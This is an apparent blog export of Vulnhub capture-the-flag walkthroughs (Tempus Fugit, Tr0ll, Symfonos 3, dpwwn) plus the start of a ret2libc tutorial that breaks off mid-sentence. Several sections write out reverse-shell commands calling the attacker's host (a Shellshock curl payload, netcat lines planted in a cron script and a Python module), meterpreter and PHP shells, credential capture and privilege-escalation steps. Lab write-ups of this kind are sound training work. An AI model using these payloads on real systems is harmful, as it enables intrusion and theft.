punctuation">)</span>        file <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> file<span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'No file selected for uploading'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> file<span class="token punctuation">.</span>filename <span class="token operator">and</span> allowed_file<span class="token punctuation">(</span>file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>            filename <span class="token operator">=</span> file<span class="token punctuation">.</span>filename            file<span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>            cmd<span class="token operator">=</span><span class="token string">"cat "</span><span class="token operator">+</span>UPLOAD_FOLDER<span class="token operator">+</span><span class="token string">"/"</span><span class="token operator">+</span>filename            result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>            flash<span class="token punctuation">(</span>result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            flash<span class="token punctuation">(</span><span class="token string">'File successfully uploaded'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>               ftp <span class="token operator">=</span> FTP<span class="token punctuation">(</span><span class="token string">'ftp.mofo.pwn'</span><span class="token punctuation">)</span>               ftp<span class="token punctuation">.</span>login<span class="token punctuation">(</span><span class="token string">'someuser'</span><span class="token punctuation">,</span> <span class="token string">'b232a4da4c104798be4613ab76d26efda1a04606'</span><span class="token punctuation">)</span>               <span class="token keyword">with</span> open<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token operator">+</span><span class="token string">"/"</span><span class="token operator">+</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                  ftp<span class="token punctuation">.</span>storlines<span class="token punctuation">(</span><span class="token string">'STOR %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">,</span> f<span class="token punctuation">)</span>                  ftp<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>               flash<span class="token punctuation">(</span><span class="token string">"Cannot connect to FTP-server"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Allowed file types are txt and rtf'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Using the credentials we logged into the FTP server, and retrieved a file named <code>cmscreds.txt</code> which had crdentials for a Content Management Service, at this point I was so clueless since the directory traversal or forced directory search wasn’t working with gobuster, uniscan and others. </p><pre class=" language-bash"><code class="language-bash">bash-4.4<span class="token comment" spellcheck="true"># cat cmscreds.txt</span><span class="token function">cat</span> cmscreds.txtAdmin-password <span class="token keyword">for</span> our new CMShardEnough4u</code></pre><p>I asked for some nudges from <a href="https://twitter.com/0xmzfr" target="_blank" rel="noopener">mzfr</a> and <a href="https://twitter.com/DCUA7" target="_blank" rel="noopener">DCUA</a>, both of them told me about the internal network the machine has, having one of them as a target which we wanted to attack. Now, I checked the <code>/root</code> folder which has some files and other stuff and one of the files has some logs having a IP address <code>172.19.0.12</code> which could be the network we want to attack. </p><p><img src="/img/TempusFugit/logs.png" alt></p><p>But again I’m clueless, so I asked <a href="https://twitter.com/4ndr34z" target="_blank" rel="noopener">4ndr34z</a> who told me to check <code>/etc/resolv.conf</code> which had an entry for <code>mofo.pwn</code> which has to be enumertaed. I ran <code>dig mofo.pwn axfr</code> which showed me an interesting subdomain named <code>ourcms.mofo.pwn</code> on IP <code>172.19.0.1</code> which was my best bet of that time.</p><pre class=" language-bash"><code class="language-bash">bash-4.4<span class="token comment" spellcheck="true"># apk fetch nmap</span>apk fetch nmapDownloading nmap-7.60-r2apk fetch nmapbash-4.4<span class="token comment" spellcheck="true"># apk add nmap-7.60-r2.apk</span>apk add nmap-7.60-r2.apk<span class="token punctuation">(</span>1/1<span class="token punctuation">)</span> Installing nmap <span class="token punctuation">(</span>7.60-r2<span class="token punctuation">)</span>Executing busybox-1.27.2-r11.triggerOK: 160 MiB <span class="token keyword">in</span> 81 packages</code></pre><blockquote><p>Warning: The dig package was not installed on the machine, use <code>apk add bind-tools</code> to get the dig package.</p></blockquote><h1 id="Stable-Shell-and-Port-Forwarding"><a href="#Stable-Shell-and-Port-Forwarding" class="headerlink" title="Stable Shell and Port Forwarding"></a>Stable Shell and Port Forwarding</h1><p>As <a href="https://twitter.com/0xmzfr" target="_blank" rel="noopener">mzfr</a> told me that I might needed a stable shell to progress more, I used the metasploit’s meterpreter shell in order to get the stable shell. For that, I first created a <code>shell.elf</code> with metasploit so we will create a callback from the shell to the meterpreter shell.<br>I used a <code>linux/x86/reverse_tcp</code> in order to create a shell.</p><p><img src="/img/TempusFugit/shellelf.png" alt></p><p>Now, let’s get connect to the meterpreter shell:-</p><ul><li>First we need to configure to the reverse shell payload to <code>linux/x86/reverse_tcp</code> and set the required options i.e. LHOST and LPORT to their values.</li></ul><p><img src="/img/TempusFugit/metapayload.png" alt></p><ul><li>Then we need to transfer that <code>shell.elf</code> we have created earlier via HTTP port, use <code>python -m SimpleHTTPServer 1337</code> in the directory where <code>shell.elf</code> is.</li></ul><p><img src="/img/TempusFugit/localhttp.png" alt></p><ul><li>Now, once you get the <code>shell.elf</code> via wget, execute it but beforehand kill the nginx server from running processes via <code>kill &lt; pid &gt;</code> so that port fowarding could be done.</li></ul><p><img src="/img/TempusFugit/revshellexec.png" alt></p><ul><li>Now, <code>run</code> the metasploit multi handler exploit to connect back to reverse shell.</li></ul><p><img src="/img/TempusFugit/meterpretershell.png" alt></p><p>Once, connected it’s time to use the metasploit’s <code>portfwd</code> utility to forward the services running on <code>ourcms.mofo.pwn</code> to the other port of our hosts.<br>Run <code>portfwd add -l 8080 -p 8080 -r 172.19.0.1</code> since, <code>ourcms.mofo.pwn</code> resides to the IP <code>172.19.0.1</code>, it’ll bound the services to the host and service at port 8080. </p><p><img src="/img/TempusFugit/portfwd.png" alt></p><blockquote><p>Warning: Edit the <code>/etc/hosts</code> and add <code>ourcms.mofo.pwn</code> to the localhost, use <code>http://ourcms.mofo.pwn:port</code> to access the services.</p></blockquote><h5 id="Error-Port-is-in-use"><a href="#Error-Port-is-in-use" class="headerlink" title="Error: Port is in use"></a>Error: Port is in use</h5><p>This might be a troubesome if you did the previous steps and messed up a little like I did.<br>Instead of using 8080 as the port, use any other which will work, though this can be a little tiresome at some point but it’ll do the work since we’ve just stumbled upon the machine we wanted to attack.</p><p><img src="/img/TempusFugit/error.png" alt></p><h1 id="Content-Managemnt-Service-and-Reverse-Shell"><a href="#Content-Managemnt-Service-and-Reverse-Shell" class="headerlink" title="Content Managemnt Service and Reverse Shell"></a>Content Managemnt Service and Reverse Shell</h1><p>Now, we can access the services, let’s log into the CMS already, going to the <code>/admin</code> route, we can sccess the admin panel, recalling what we got from the very first FTP server the credentials which was <code>admin:hardEnough4u</code> and we are logged in. As we are the admin, we can edit, create and do whatever we want to do to server. Now, edit the themes with pentestmonkey’s PHP reverse shell and enter the content of it in <code>themes</code>, use the URL specified at the top of the editor and stat the listener to connect to the shell.</p><p><img src="/img/TempusFugit/phpshell.png" alt></p><p>Once connected to the shell, I did some basic enumeration but somehow there wasn’t any clue to leverage and we had lots of user. With some little help I used the wireshark and the Responder tool to get the password of the another user.<br>Just start the wireshark and start the responder in the background and continue enumerating your machine. After 5 minutes or so, I saw the responder output and it had the credentials for <code>gerianne</code> and password <code>barbie</code>.</p><p><img src="//img/TempusFugit/geeklocalpass.png" alt></p><p>Using those credentials, I leveraged upto user gerianne.</p><p><img src="/img/TempusFugit/gerianne.png" alt></p><p>While I was eumerating the machine I found that there was a email in <code>/var/mail</code> for user gerianne. Now, since we have access to it, let’s see what it has:</p><p><img src="/img/TempusFugit/mail.png" alt></p><p>User merry has given us the password via mail, which was <code>merry:9a4lw0r82mj8</code> now we can leverage upto the user merry. Let’s get to the root now, probably?</p><h5 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h5><p>As user gerianne, I found the user flag in it’s home directory.</p><p><img src="/img/TempusFugit/userflag.png" alt></p><h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>As usual, trying <code>sudo -l</code> showed that I can use <code>cpulimit</code> binary as sudo.</p><p><img src="/img/TempusFugit/sudol.png" alt></p><p>Going over <a href="https://gtfobins.github.io/gtfobins/cpulimit/#sudo" target="_blank" rel="noopener">gtfobins</a> I found that doing <code>sudo cpulimit -l 100 -f /bin/sh</code> made us root. </p><p><img src="/img/TempusFugit/root.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap, ctf, vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Tr0ll:1</title>
      <link href="/2019/08/24/troll1/"/>
      <url>/2019/08/24/troll1/</url>
      
        <content type="html"><![CDATA[<p>Today, we are going to pwn Troll:1 from <a href="https://www.vulnhub.com/entry/tr0ll-1,100/" target="_blank" rel="noopener">Vulnhub</a> by <a href="https://twitter.com/@maleus21" target="_blank" rel="noopener">maleus</a>.</p><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Running a nmap scan on the machine for analysing the services running on the machine. Doing that so, <code>nmap -sV -sC -A -p- -T5 102.168.43.169</code><br><img src="/../img/troll/nmap.png" alt></p><h1 id="FTP-Enumeration"><a href="#FTP-Enumeration" class="headerlink" title="FTP Enumeration"></a>FTP Enumeration</h1><p>From our nmap scan we knew that it FTP has Anonymous login enabled, so using ftp package we log in to ftp as anonymous user and found there was a <code>lol.pcap</code>.</p><p><img src="../img/troll/ftp.png" alt></p><p>Opening it in wireshark, we can see there is a <code>secret_txt</code> somewhat existed in a network from where this traffic was captured. So I tried to follow the TCP stream and found that there is a directory mentioned in that specific file.</p><p><img src="../img/troll/wireshark.png" alt></p><h1 id="HTTP-Service-Enumeration"><a href="#HTTP-Service-Enumeration" class="headerlink" title="HTTP Service Enumeration"></a>HTTP Service Enumeration</h1><p>Beforehand, I tried checking <code>robots.txt</code> and found out that we have been trolled again from the mentioned <code>/secret</code> page like the index page.</p><p><img src="../img/troll/web1.png" alt></p><p>Robots.txt’s content:-</p><pre><code>User-agent:*Disallow: /secret</code></pre><p>From that pcap file we founded a directory reference so let’s try it,that directory listing from the web I found that there is a binary and it was 32 Bit ELF, running it shows the following string:-</p><p><img src="/../img/troll/hiidendir.png" alt></p><pre><code>robin@oracle:~/Vulnhub/Tr0ll$ ./roflmaoFind address 0x0856BF to proceed</code></pre><p>That was a directory reference, going over there I found 2 more directories.<br><img src="../img/troll/hexxdir.png" alt></p><p>The <code>good_luck</code> directory has <code>which_one_lol.txt</code> having following data:-</p><pre><code>maleusps-auxfeluxEagle11genphlux &lt; -- Definitely not this oneusmc8892blawrgwytshadowvis1t0roverflow</code></pre><p>Other one has a text file named <code>Pass.txt</code> which says <code>Good_luck:-)</code>.</p><h1 id="SSH-Login-and-Root-Flag"><a href="#SSH-Login-and-Root-Flag" class="headerlink" title="SSH Login and Root Flag"></a>SSH Login and Root Flag</h1><p>Using hydra to craft a dictionary attack. since at this point it was way too clear. Now, I tried doing th attack with <code>hydra -L new.txt -P pass.txt 192.168.43.169 ssh</code> which was giving a error, I had no idea what is happening sice the machine involved some trolling for the users, aftering spending 15 minutes on the argument being provided to the hydra, I tried <code>hydra -L user.txt -p Pass.txt 192.168.43.169 ssh</code> which gave us the password <code>Pass.txt</code> for user <code>overflow</code>, oh god that was definitely a good troll.</p><p><img src="../img/troll/sshcreds.png" alt></p><p>Now, there are some commands I usually run in order to find anything interesting, so while trying them, I found the linux kernel is way too old usingg <code>uname -a</code> which in our case seems exploitabe. Using <a href="https://www.exploit-db.com/download/37292" target="_blank" rel="noopener">this</a> exploit, I downloaded it on my host machine and started a local HTTP server via <code>python -m SimpleHTTPServer 1337</code> in order to transfer te file to the machine.<br><img src="../img/troll/localhttp.png" alt></p><p>Now, I checked whether the machine has gcc installed or not and to our surprise it does. Now,let’s compile and run it already. Using <code>gcc -o root root.c</code> since I renamed that file to <code>root.c</code>. Running that exploit gave us root shell.</p><p><img src="../img/troll/root.png" alt></p><h5 id="The-Flag"><a href="#The-Flag" class="headerlink" title="The Flag"></a>The Flag</h5><p>Time to get flag:-</p><p><img src="../img/troll/rootflag.png" alt></p><p>That was it, until then enjoy.</p><h5 id="Fun"><a href="#Fun" class="headerlink" title="Fun"></a>Fun</h5><p>While enumerating the system I found <code>lamo.py</code> in <code>/opt</code> folder which was the cause of our automatic connection close because of timing constraints. Here, it’s content:-</p><p><img src="../img/troll/fun.png" alt></p><p>Just after checking it, I got disconnected. </p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap, ctf, vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Symfonos 3</title>
      <link href="/2019/08/04/symfonos3-writeup/"/>
      <url>/2019/08/04/symfonos3-writeup/</url>
      
        <content type="html"><![CDATA[<p>This is a walkthrough of Symfonos 3 which is 3rd machine in Symfonod series.</p><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Let’s scan the network and start working on the machine right away. Using <code>nmap -sV -sC -A -p- -T5 192.168.43.22</code> shows that we have FTP, SSH and HTTP.</p><p><img src="/img/symfonos3/nmap.png" alt></p><h1 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a>HTTP Enumeration</h1><p>This was kind of time consuming since it involves lots of nested directory busting, I mostly use gobutser so with some bash scripting I automated the scan by updating the script with every finding.<br>My strategy for that was to copy every dictionary/wordlists into a single directory and using the bash we used it to find the directories. I used <strong>dirbuster</strong> and <strong>dirb</strong> wordlists only.</p><pre><code>#!/bin/shfor i in $(pwd)/*.txt; do    gobuster dir -u http://192.168.43.22 -w &quot;$i&quot; | grep Status: done</code></pre><p>First, I found <code>gate</code>, then <code>cerberus</code> after that <code>tartarus</code>. After that I tried again with the script this time we got more than 4 hits:-</p><pre><code>=============================================================== Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:            http://192.168.43.22/gate/cerberus/tartarus/[+] Threads:        10[+] Wordlist:       /usr/share/wordlists/dirb/big.txt[+] Status codes:   200,204,301,302,307,401,403[+] User Agent:     gobuster/3.0.1[+] Timeout:        10s===============================================================2019/08/04 01:28:56 Starting gobuster===============================================================/.htaccess (Status: 403)/.htpasswd (Status: 403)/charon (Status: 301)/hermes (Status: 301)/research (Status: 200)===============================================================</code></pre><p>But somehow <code>research</code> was a rabbit hole, perhaps a wild goose chase for us. Then, I tried again with <code>cgi-bin</code> from previous findings. Now directory busting to the <code>http://192.168.43.22/cgi-bin</code>, I found a hit at <code>underworld</code>. PS: In case you don’t know about greek mythology, underworld is home of the god <strong>Hades</strong>.</p><pre><code>#!/bin/shfor i in $(pwd)/*.txt; do    gobuster dir -u http://192.168.43.22/cgi-bin -w &quot;$i&quot; | grep Status: done</code></pre><hr><p>root@kali:/usr/share/wordlists/dirb# ./new.sh<br>/.htaccess (Status: 403)<br>/.htpasswd (Status: 403)<br>/.htaccess (Status: 403)<br>/.htpasswd (Status: 403)<br>/.hta (Status: 403)<br>/underworld (Status: 200)</p><hr><p><img src="/img/symfonos3/underworld.png" alt><br>There, we got the <code>underworld</code>, the real game begins from here.</p><h1 id="Reverse-Shell-and-FTP-Network-Sniffing"><a href="#Reverse-Shell-and-FTP-Network-Sniffing" class="headerlink" title="Reverse Shell and FTP Network Sniffing"></a>Reverse Shell and FTP Network Sniffing</h1><p>From that page we can see that it’s saying <code>uptime</code>, I tried to enumerate more but somehow none worked. I switched to some research on similar machines to get information about this thinking that it might have been some kind of task of a machine.<br>From that I found a machine from PentesterLab which has <strong>kind of</strong> vulnerability but after checking it I was confirmed that it was same. The vulnerability is named <strong>ShellShock</strong>. In this type of vulnerablity you have the pass the bash command as a User-Agent for that particular request. So, using the following command with the help of curl, we get a reverse shell on our host machine.</p><pre><code>robin@oracle:~$ curl -A &quot;() { :; }; /bin/bash -c &#39;nc 192.168.43.243 1337 -e /bin/sh&#39;&quot; http://192.168.43.22/cgi-bin/underworld</code></pre><p>Once, we get reverse shell I found out we have privilge of cerberus, so from some basc enumeration I didn’t found anything so I thought of using the <code>pspy</code> script which is useful for tracing the background proccesses. Using <code>pspy</code>  after using wget to grab it from server I found out there is a ftp server is running in the background. I thought of checking the directory too but permission denied.<br>Now, I started grabbing the network dump using tcpdump since it ws available for usage, using <code>tcpdump -w ftplog.pcap -i lo</code>, the FTP server was runiing on the <code>lo</code> interface because the other one has our reverse shell connected to using shellshock. SInce, I first grabbed the <code>en0ps17</code> but I saw that our curl is making request to server. </p><p><img src="/img/symfonos3/pspy.png" alt></p><blockquote><p>Warning: Let the tcpdump run for 5-10 minutes so you can grab enough data to analyse.</p></blockquote><p>I saved the file in <code>/tmp</code> folder and started a HTTP server using python <code>python -m SimpleHTTPServer 1234</code> and grabbed the <code>ftplog.pcap</code> right away from <code>http://192.168.43.22:1234</code>.</p><p>After opening it in wireshark and filtering out the packets for FTP only with <code>tcp.port == 21</code>, I got some packets with FTP service and following TCP Stream of that packet I found the user <code>hades</code> password.</p><p><img src="/img/symfonos3/hades.png" alt></p><h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>Once you SSH into the system as user <strong>hades</strong> with the above password you’ll find out that we have the same thing as user cerberus. So, the last option was to run the <code>pspy</code> again, doing that so I found that we have nothing more nothing less than previous scan. I started trying again in ftpclient, this time we can access the folder which has a python script which is running the server by the <strong>root</strong> itself. So, there is <strong>more to see than meets the eye</strong>. </p><p>After analysing the script I found that script is using a module named <code>ftplib.py</code> in <code>/opt/ftpclient</code> which is running as root, as from my previous experience I thought that we need to edit the module file itself to get root privilges or anything to get moving. I checked permission and it turns out we can edit it since the user <code>hades</code> ia belong to group <code>gods</code>. </p><p><img src="/img/symfonos3/ftpclient.png" alt></p><p>Now, I added a line <code>os.system(&quot;nc 192.168.43.243 4444 -e /bin/bash)</code> in the file so that once the script will be run our reverse shell gets executed giving a root shell. So, once done I started my listener and start analysing the process again, once that script runs we have the shell as <strong>root</strong>.<br>Hence, the flag. </p><p><img src="/img/symfomos3/root.png" alt></p><p>Thanks to <a href="https://twitter.com/zayotic" target="_blank" rel="noopener">@zayotic</a> for making this wonderful machine.</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap, ctf, vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - dpwnn1</title>
      <link href="/2019/08/01/dpwwn/"/>
      <url>/2019/08/01/dpwwn/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Starting off with the nmap, using <code>nmap -sV -sC -A 192.168.43.59</code> shows us that 22, 80 and 3306 i.e. SSH, HTTP, MySQL are open respectively.</p><p><img src="/img/dpwwn/nmap.png" alt></p><h1 id="HTTP-and-MySQL-Enumeration"><a href="#HTTP-and-MySQL-Enumeration" class="headerlink" title="HTTP and MySQL Enumeration"></a>HTTP and MySQL Enumeration</h1><p>I fired up the gobuster and while it was running I tried to check that HTTP server and the source in order to find something useful but somehow it’s not relevant in any way and the gobuster has only given <code>/info.php</code> which as also not useful. So I tried MySQL service, using <code>mysql -h 192,168.43.59 -u root</code> which logged us into the mysql service of the machine. Using <code>SHOW DATABASES;</code> shows us that we have a database named <code>ssh</code>, selecting that database with <code>USE ssh</code> which has a table named <code>users</code> which can be seen by providing the command <code>SHOW TABLES;</code> and finally using <code>SELECT * FROM users</code> shows us that user and it’s corresponding password which was <code>mistic:testP@$$swordmistic</code>.</p><p><img src="/img/dpwwn/mysql.png" alt></p><h1 id="SSH-Login-and-Root-Flag"><a href="#SSH-Login-and-Root-Flag" class="headerlink" title="SSH Login and Root Flag"></a>SSH Login and Root Flag</h1><p>Using the credentials we found above, we logged into the ssh as user mistic. </p><p><img src="/img/dpwwn/ssh.png" alt></p><p>For the root, it was easy since the working directory of user mistic has a file <code>logrot.sh</code> which was a cronjob runs by the root and was collecting logs.<br>Checking the permission we can see that it can be edited by the user mistic so using <code>vi logrot.sh</code> and changing the mode to the input I entered the follwoing data whch will spawn the root shell as reverse callback due to that cronjob running.</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>mistic@dpwwn-01 ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> logrot.sh<span class="token comment" spellcheck="true">#!/bin/bash</span>nc -e /bin/bash 192.168.43.243 1234</code></pre><p>Hence, spawning the root shell.</p><p><img src="/img/dpwwn/root.png" alt></p><h5 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h5><p>Well, all the way down here for the flag:-</p><p><img src="/img/dpwwn/rootflag.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap, ctf, vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP - ret2libc attack</title>
      <link href="/2019/07/29/ret2libc-pwntools/"/>
      <url>/2019/07/29/ret2libc-pwntools/</url>
      
        <content type="html"><![CDATA[<p>Today, I will show you how to use Return Oriented Programming for doing a <strong>ret2libc</strong> attack.</p><h1 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h1><p>This is much more harder than what we encountered earlier, unlike before we won’t have any function preloaded with strings like <code>/bin/cat flag.txt</code>. It won’t even contain a <code>system</code> so we will use <code>libc.so.6</code> to get the <code>system</code> and <code>/bin/sh</code> address to spawn a shell.</p><h1 id="What-is-Return-to-libc-or-ret2libc-attack"><a href="#What-is-Return-to-libc-or-ret2libc-attack" class="headerlink" title="What is Return-to-libc or ret2libc attack?"></a>What is Return-to-libc or ret2libc attack?</h1><p>A “return-to-libc” attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, bypassing the no-execute bit feature (if present) and ridding the attacker of the need to inject their own code.</p><p>Returning to libc is a method of exploiting a buffer overflow on a system that has a non-executable stack, it is very similar to a standard buffer overflow, in that the return address is changed to point at a new location that we can control. However since no executable code is allowed on the stack we can’t just tag in shellcode.   This is the reason we use the return into libc trick and utilize a function provided by the library. We still overwrite the return address with one of a function in libc, pass it the correct arguments and have that execute for us. Since these functions do not reside on the stack, we can bypass the stack protection and execute code.</p><h1 id="Binary-Analysis"><a href="#Binary-Analysis" class="headerlink" title="Binary Analysis"></a>Binary Analysis</h1><p>Let’s try <code>checksec bitterman</code> and see what protections are enabled.</p><pre><code>Arch:     amd64-64-little RELRO:    No RELROStack:    No canary found NX:       NX enabled PIE:      No PIE</code></pre><p><strong>NX</strong> is enabled that means we have a non executable stack, hence we need a ret2libc attack.Let’s load up the binary into radare2 and start analysing.</p><pre><code> 0x0040077c      bfc9084000     mov edi, str.Please_enter_your_text: ; .//main.c:23 ; 0x4008c9 ; &quot;&gt; Please enter your text: &quot; ; const char * s|           0x00400781      e89afdffff     call sym.imp.puts           ; int puts(const char *s)|           0x00400786      488b050b0520.  mov rax, qword [obj.stdout] ; loc.stdout ; [0x600c98:8]=0|           0x0040078d      4889c7         mov rdi, rax                ; FILE *stream|           0x00400790      e8dbfdffff     call sym.imp.fflush         ; int fflush(FILE *stream)|           0x00400795      488b9568ffff.  mov rdx, qword [local_98h]  ; .//main.c:24 ; size_t nbyte</code></pre><p>It uses <code>puts</code> that seems vulnerable? Can’t say much without checking. So, let’s use gdb-peda:-</p><pre><code>gdb-peda$ rStarting program: /home/robin/ROP-Emporium/bitterman &gt; What&#39;s your name? robinHi, robin&gt; Please input the length of your message: 512&gt; Please enter your text:**--pattern created--**</code></pre><p>Doing that, we get <strong>Program received signal SIGSEGV, Segmentation fault.</strong>, look like the stack overflowed i.e. a buffer overflow. So, let’s continue analysing the stack and core that has been dumped.</p><pre><code>[----------------------------------registers-----------------------------------]RAX: 0x0 RBX: 0x0 RCX: 0xb40 (&#39;@\x0b&#39;)RDX: 0x0 RSI: 0x7ffff7dd18c0 --&gt; 0x0 RDI: 0x7ffff7dd0760 --&gt; 0xfbad2a84 RBP: 0x415341416f414152 (&#39;RAAoAASA&#39;)RSP: 0x7fffffffde48 (&quot;ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)RIP: 0x4007e1 (&lt;main+245&gt;:    ret)R8 : 0x7ffff7dd18c0 --&gt; 0x0 R9 : 0x7ffff7fdc4c0 (0x00007ffff7fdc4c0)R10: 0x7ffff7b82cc0 --&gt; 0x2000200020002 R11: 0x246 R12: 0x400590 (&lt;_start&gt;:    xor    ebp,ebp)R13: 0x7fffffffdf20 --&gt; 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x4007d6 &lt;main+234&gt;:    call   0x400570 &lt;fflush@plt&gt;   0x4007db &lt;main+239&gt;:    mov    eax,0x0   0x4007e0 &lt;main+244&gt;:    leave  =&gt; 0x4007e1 &lt;main+245&gt;:    ret       0x4007e2:    nop    WORD PTR cs:[rax+rax*1+0x0]   0x4007ec:    nop    DWORD PTR [rax+0x0]   0x4007f0 &lt;__libc_csu_init&gt;:    push   r15   0x4007f2 &lt;__libc_csu_init+2&gt;:    push   r14[------------------------------------stack-------------------------------------]0000| 0x7fffffffde48 (&quot;ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)0008| 0x7fffffffde50 (&quot;AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)0016| 0x7fffffffde58 (&quot;VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)0024| 0x7fffffffde60 (&quot;AuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)0032| 0x7fffffffde68 (&quot;AAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)0040| 0x7fffffffde70 (&quot;ZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)0048| 0x7fffffffde78 --&gt; 0xd21ca0043fad380a 0056| 0x7fffffffde80 --&gt; 0x400590 (&lt;_start&gt;:    xor    ebp,ebp)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0x00000000004007e1 in main (argc=0x1, argv=0x7fffffffdf28) at main.c:2828    main.c: No such file or directory.</code></pre><p>Look, at <strong>RSP</strong> register is full of our pattern, in 64-bit register we cant overwrite <strong>RIP</strong> straight away so let’s see our stack <strong>RSP</strong>, the Stack Pointer points to our input, we need to fix the return address and inject our code but for that we need to know where overflow occurs. Doing similar from what we did earlier let’s get started:-</p><pre><code>gdb-peda$ x/xg $rsp0x7fffffffde48:    0x7141415441417041gdb-peda$ pattern offset 0x71414154414170418160875829899915329 found at offset: 152</code></pre><ul><li><code>x/xg</code> : This loads the memory address of <strong>RSP</strong> register in hex format and in 64-bit format.</li><li><code>pattern offset &lt; value &gt;</code> : This shows after how many bytes the overflow occured.</li></ul><p>We get the overflow limit i.e. <strong>152</strong>.</p><h1 id="Stage-1-Leaking-the-address"><a href="#Stage-1-Leaking-the-address" class="headerlink" title="Stage 1: Leaking the address"></a>Stage 1: Leaking the address</h1><p>First, as told earlier we need to get <code>put</code> address from the running process. First, we need leak address then we need to get the constant distance which means the offset for it after that we will get to execute our code.</p><p>Let’s get <code>puts</code> using <code>objdump -D bitterman | grep puts</code> :-</p><pre><code>400520:    ff 25 2a 07 20 00        jmpq   *0x20072a(%rip)        # 600c50 &lt;puts@GLIBC_2.2.5&gt;</code></pre><p>As you can see we have one address at the left and one i the right. Let m clarify this:-</p><hr><p>PLT stands for Procedure Linkage Table which is, put simply, used to call external procedures/functions whose address isn’t known in the time of linking, and is left to be resolved by the dynamic linker at run time.<br>GOT stands for Global Offsets Table and is similarly used to resolve addresses.The Global Offset Table (or GOT) is a section inside of programs that holds addresses of functions that are dynamically linked. As mentioned in the page on calling conventions, most programs don’t include every function they use to reduce binary size. Instead, common functions (like those in libc) are “linked” into the program so they can be saved once on disk and reused by every program. </p><hr><p>So, we get the address of <strong>PLT</strong> and 